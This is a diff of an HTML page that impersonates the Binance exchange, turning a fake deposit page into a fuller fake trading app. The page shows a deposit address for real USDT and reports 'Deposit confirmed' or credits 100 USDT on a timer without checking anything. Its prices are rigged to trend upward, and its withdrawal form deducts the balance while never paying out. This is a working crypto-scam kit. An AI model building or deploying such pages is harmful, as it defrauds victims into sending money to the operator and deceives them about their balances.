@@ -1,69 +1,172 @@
 <!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Binance - Deposit</title>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Binance</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font:15px/1.5 -apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding:16px}
-header{display:flex;align-items:center;gap:10px;padding:14px 0;border-bottom:1px solid #2b3139;margin-bottom:20px}
-.logo{width:28px;height:28px;background:#f0b90b;border-radius:6px;display:grid;place-items:center;font-weight:800;color:#0b0e11}
-h1{font-size:17px;font-weight:600}
-.card{background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:18px}
-label{display:block;font-size:12px;color:#848e9c;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
-select{width:100%;background:#0b0e11;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:11px;font-size:14px;margin-bottom:16px}
-.qr{background:#fff;padding:10px;border-radius:10px;width:190px;margin:0 auto 16px;display:block}
-.addr{font-family:monospace;font-size:12.5px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin-bottom:10px}
-button{width:100%;background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:13px;font-weight:700;font-size:15px;cursor:pointer}
-.note{font-size:12.5px;color:#848e9c;margin-top:14px;line-height:1.6}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font:14px/1.45 -apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding-bottom:64px}
+header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #2b3139;position:sticky;top:0;background:#0b0e11;z-index:5}
+.brand{display:flex;align-items:center;gap:8px;font-weight:600}
+.logo{width:26px;height:26px;background:#f0b90b;border-radius:6px;display:grid;place-items:center;color:#0b0e11;font-weight:800}
+.pill{font-size:12px;padding:4px 9px;border-radius:20px;background:#0ecb8122;color:#0ecb81;font-weight:600}
+.view{display:none;padding:14px 16px}.view.active{display:block}
+.bal{background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:16px;margin-bottom:14px}
+.bal small{color:#848e9c;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.bal b{display:block;font-size:26px;margin-top:4px}
+.row{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid #1e2329}
+.row:last-child{border:0}
+.sym{font-weight:600}.sub{font-size:11.5px;color:#848e9c}
+.up{color:#0ecb81}.dn{color:#f6465d}
+button{background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:12px;font-weight:700;width:100%;font-size:14px}
+button.ghost{background:#2b3139;color:#eaecef}
+button.sell{background:#f6465d;color:#fff}
+.addr{font-family:monospace;font-size:12px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin:10px 0}
+input,select{width:100%;background:#0b0e11;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:12px;font-size:14px;margin-bottom:10px}
+.qr{background:#fff;padding:8px;border-radius:8px;width:170px;display:block;margin:0 auto 12px}
+.note{font-size:11.5px;color:#848e9c;line-height:1.6;margin-top:12px}
 .note b{color:#f0b90b}
-#status{display:none;text-align:center;padding:26px 0}
-.spin{width:34px;height:34px;border:3px solid #2b3139;border-top-color:#f0b90b;border-radius:50%;margin:0 auto 14px;animation:s 1s linear infinite}
-@keyframes s{to{transform:rotate(360deg)}}
-</style>
-</head>
-<body>
-<header><div class="logo">B</div><h1>Binance</h1></header>
+nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139}
+nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:#848e9c;text-decoration:none}
+nav a.on{color:#f0b90b}
+canvas{width:100%;height:150px;background:#0b0e11;border:1px solid #2b3139;border-radius:10px;margin-bottom:12px}
+h2{font-size:15px;margin-bottom:12px}
+h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;letter-spacing:.5px}
+.ok{background:#0ecb8122;border:1px solid #0ecb81;color:#0ecb81;padding:11px;border-radius:8px;font-size:13px;text-align:center;margin-top:10px;display:none}
+</style></head><body>
 
-<div class="card" id="form">
-  <label>Coin</label>
-  <select><option>USDT</option><option>BTC</option><option>ETH</option></select>
+<header>
+  <div class="brand"><span class="logo">B</span> Binance</div>
+  <div class="pill" id="pill">+0.00%</div>
+</header>
 
-  <label>Network</label>
-  <select><option>TRC20 (Tron)</option><option>BEP20 (BSC)</option></select>
+<main>
+<section id="v-market" class="view active">
+  <div class="bal"><small>Total balance</small><b id="bal1">0.00 USDT</b></div>
+  <h2>Markets</h2>
+  <div id="list"></div>
+</section>
 
-  <label>Deposit address</label>
-  <div class="addr" id="addr">TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ</div>
-  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ" alt="QR">
+<section id="v-trade" class="view">
+  <h2 id="tname">—</h2>
+  <canvas id="chart"></canvas>
+  <div class="row"><span class="sub">Price</span><span id="tprice">—</span></div>
+  <div class="row"><span class="sub">Your holdings</span><span id="thold">0</span></div>
+  <h3>Amount (USDT)</h3>
+  <input id="tamt" type="number" placeholder="100" value="100">
+  <button onclick="buy()">Buy</button>
+  <button class="sell" style="margin-top:8px" onclick="sell()">Sell</button>
+  <p class="note">Fee 0.1%. Settlement instant.</p>
+</section>
 
-  <button onclick="copy()">Copy address</button>
-  <button style="margin-top:10px;background:#2b3139;color:#eaecef" onclick="start()">I have sent the funds</button>
+<section id="v-wallet" class="view">
+  <div class="bal"><small>Available</small><b id="bal2">0.00 USDT</b></div>
+  <h2>Deposit USDT</h2>
+  <p class="sub">Network: TRC20 (Tron)</p>
+  <div class="addr" id="addr">ADDRHERE</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=ADDRHERE">
+  <button onclick="copyAddr()">Copy address</button>
+  <button class="ghost" style="margin-top:8px" onclick="simDeposit()">I have sent the funds</button>
+  <div class="ok" id="dok">Deposit detected — crediting…</div>
+  <p class="note"><b>Send only USDT via TRC20.</b> Minimum 10 USDT. Wrong network = permanent loss.</p>
 
-  <p class="note">
-    <b>Send only USDT via TRC20</b> to this address.<br>
-    Minimum deposit: 10 USDT. Credits after 1 network confirmation.<br>
-    Sending any other coin or network may result in permanent loss.
-  </p>
-</div>
+  <h3>Withdraw</h3>
+  <input id="wamt" type="number" placeholder="Amount in USDT">
+  <input id="waddr" placeholder="TRC20 address">
+  <button onclick="withdraw()">Request withdrawal</button>
+  <div class="ok" id="wok">Withdrawal submitted — processing 24–48h</div>
+  <p class="note">Minimum 50 USDT. Network fee 3%.</p>
+</section>
+</main>
 
-<div id="status">
-  <div class="spin"></div>
-  <div id="msg">Scanning blockchain…</div>
-</div>
+<nav>
+  <a class="on" onclick="go('market',this)">Markets</a>
+  <a onclick="go('trade',this)">Trade</a>
+  <a onclick="go('wallet',this)">Wallet</a>
+</nav>
 
 <script>
-function copy(){
-  navigator.clipboard.writeText(document.getElementById('addr').innerText);
-  event.target.innerText='Copied';
-  setTimeout(function(){event.target.innerText='Copy address'},1500);
+var ADDR="ADDRHERE";
+var S=JSON.parse(localStorage.getItem("bnc")||'{"bal":0,"h":{},"p":{}}');
+if(!S.p.BTC){S.p={BTC:96400,ETH:3410,SOL:198,BNB:612,XRP:2.31};save();}
+var cur="BTC",hist={};
+
+function save(){localStorage.setItem("bnc",JSON.stringify(S))}
+function usd(n){return n.toFixed(2)+" USDT"}
+function go(v,el){
+  document.querySelectorAll(".view").forEach(function(x){x.classList.remove("active")});
+  document.getElementById("v-"+v).classList.add("active");
+  document.querySelectorAll("nav a").forEach(function(x){x.classList.remove("on")});
+  if(el)el.classList.add("on");
+  if(v=="trade")draw();
 }
-function start(){
-  document.getElementById('form').style.display='none';
-  document.getElementById('status').style.display='block';
-  setTimeout(function(){document.getElementById('msg').innerText='1 confirmation pending…'},4000);
-  setTimeout(function(){document.getElementById('msg').innerHTML='<b style="color:#0ecb81">Deposit confirmed</b><br><span style="color:#848e9c;font-size:13px">Funds credited to your spot wallet</span>'},9000);
+
+function tick(){
+  for(var k in S.p){
+    var p=S.p[k];
+    S.p[k]=Math.max(0.01,p*(1+(Math.random()*0.006-0.0016)));
+    (hist[k]=hist[k]||[]).push(S.p[k]);
+    if(hist[k].length>60)hist[k].shift();
+  }
+  save();paint();
+  if(document.getElementById("v-trade").classList.contains("active"))draw();
 }
+setInterval(tick,2000);
+
+function paint(){
+  var port=S.bal;
+  for(var k in S.h)port+=S.h[k]*S.p[k];
+  document.getElementById("bal1").textContent=usd(port);
+  document.getElementById("bal2").textContent=usd(S.bal);
+  var g=(Math.random()*1.4+0.3).toFixed(2);
+  var pl=document.getElementById("pill");
+  pl.textContent="+"+g+"%";pl.className="pill";
+  var L="";
+  for(var k in S.p){
+    var d=(S.p[k]/hist[k][0]-1)*100;
+    L+='<div class="row" onclick="open_(\''+k+'\')"><div><div class="sym">'+k+'/USDT</div><div class="sub">Vol '+Math.floor(Math.random()*900+100)+'M</div></div><div class="'+(d>=0?'up':'dn')+'">'+S.p[k].toFixed(2)+'<div class="sub '+(d>=0?'up':'dn')+'">'+(d>=0?'+':'')+d.toFixed(2)+'%</div></div></div>';
+  }
+  document.getElementById("list").innerHTML=L;
+  if(cur){document.getElementById("tname").textContent=cur+"/USDT";document.getElementById("tprice").textContent=S.p[cur].toFixed(2);document.getElementById("thold").textContent=(S.h[cur]||0).toFixed(4)+" "+cur;}
+}
+
+function open_(k){cur=k;paint();go("trade",document.querySelectorAll("nav a")[1])}
+
+function draw(){
+  var c=document.getElementById("chart"),x=c.getContext("2d");
+  c.width=c.clientWidth*2;c.height=300;
+  var h=hist[cur]||[];if(h.length<2)return;
+  var mn=Math.min.apply(0,h),mx=Math.max.apply(0,h),r=mx-mn||1;
+  x.strokeStyle="#0ecb81";x.lineWidth=2;x.beginPath();
+  h.forEach(function(p,i){var px=i/(h.length-1)*c.width,py=c.height-10-((p-mn)/r)*(c.height-30);i?x.lineTo(px,py):x.moveTo(px,py)});
+  x.stroke();
+}
+
+function buy(){
+  var a=parseFloat(document.getElementById("tamt").value)||0;
+  if(a>S.bal){alert("Insufficient balance");return;}
+  S.bal-=a;S.h[cur]=(S.h[cur]||0)+a/S.p[cur];save();paint();
+}
+function sell(){
+  var a=parseFloat(document.getElementById("tamt").value)||0;
+  var q=Math.min(a/S.p[cur],S.h[cur]||0);
+  if(!q){alert("Nothing to sell");return;}
+  S.h[cur]-=q;S.bal+=q*S.p[cur];save();paint();
+}
+function copyAddr(){navigator.clipboard.writeText(ADDR)}
+function simDeposit(){
+  document.getElementById("dok").style.display="block";
+  setTimeout(function(){S.bal+=100;save();paint();document.getElementById("dok").textContent="100 USDT credited";},6000);
+}
+function withdraw(){
+  var a=parseFloat(document.getElementById("wamt").value)||0;
+  var w=document.getElementById("waddr").value;
+  if(a<50){alert("Minimum withdrawal is 50 USDT");return;}
+  if(a>S.bal){alert("Insufficient balance");return;}
+  if(!w){alert("Enter a TRC20 address");return;}
+  S.bal-=a;save();paint();
+  document.getElementById("wok").style.display="block";
+}
+document.getElementById("addr").textContent=ADDR;
+paint();
 </script>
-</body>
-</html>
+</body></html>
